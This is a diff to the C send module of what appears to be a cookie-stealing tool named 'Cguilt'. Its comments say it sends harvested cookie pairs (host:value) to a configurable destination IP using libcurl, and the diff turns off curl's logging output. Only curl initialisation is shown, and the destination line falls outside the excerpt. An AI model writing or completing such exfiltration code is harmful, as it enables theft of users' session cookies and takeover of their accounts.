@@ -1,9 +1,15 @@
+/*
+    @ Cguilt: send module.
+    @ Sending cookie pairs. 
+    @ To change destination ip check line 55.
+*/
+
 #include "send.h"
 
 #include <string.h>
 #include <curl/curl.h>
 
-#define CURL_LOG_SHOW
+#define CURL_LOG_OFF
 
 
 /* Will send one cookie pair (host:value).
@@ -11,14 +17,14 @@
 uint8_t send_single_cookie(cookies_datatype* c_value)
 {
 
-    #ifndef CURL_LOG_SHOW
+    #ifndef CURL_LOG_OFF
     printf("[curl] Initialising curl...\n");
     #endif
 
     CURL* curl;
     curl = curl_easy_init();
 
-    #ifndef CURL_LOG_SHOW
+    #ifndef CURL_LOG_OFF
     printf("[curl] Passed. Curl was initialised.\n");
     #endif
 
